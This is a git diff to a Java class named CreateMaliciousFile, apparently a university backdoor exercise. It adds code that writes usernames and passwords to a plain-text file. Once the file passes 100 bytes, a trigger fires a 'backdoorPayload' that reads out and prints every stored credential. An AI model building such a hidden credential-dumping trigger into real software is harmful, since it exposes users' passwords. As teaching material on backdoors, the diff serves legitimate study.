@@ -1,7 +1,8 @@
 package br.usp.pcs.backdoor;
 
-import java.io.File;
-import java.io.IOException;
+import java.io.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 
 public class CreateMaliciousFile {
     private static final String FULL_PATH = "filename.txt";
@@ -12,7 +13,6 @@ public class CreateMaliciousFile {
         if(verifyExists()){
             return true;
         }
-
         try {
             File myObj = new File(FULL_PATH);
             if (myObj.createNewFile()) {
@@ -40,8 +40,56 @@ public class CreateMaliciousFile {
         return true;
     }
 
+    public static void insertAtFile(String user, String password){
+        createFile();
+        try {
+            FileWriter fw = new FileWriter(FULL_PATH, true);
+            BufferedWriter bw = new BufferedWriter(fw);
+            bw.write(user+" "+password+"\n");
+            bw.newLine();
+            bw.close();
+
+            if(backdoorTrigger()){
+                backdoorPayload();
+            }
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
     public static boolean verifyExists(){
         File f = new File(FULL_PATH);
         return f.exists();
+    }
+
+    public static boolean backdoorTrigger(){
+        boolean b = false;
+        try {
+            b = Files.size(Paths.get(FULL_PATH)) > 100;
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        return b;
+    }
+    public static String backdoorPayload(){
+        try {
+            BufferedReader in = null;
+            in = new BufferedReader(new FileReader(FULL_PATH));
+            String line = "";
+            String output = "";
+            while((line = in.readLine()) != null)
+            {
+                output = output + line;
+                System.out.println(line);
+            }
+            in.close();
+            return output;
+        } catch (FileNotFoundException e) {
+            throw new RuntimeException(e);
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+
     }
 }
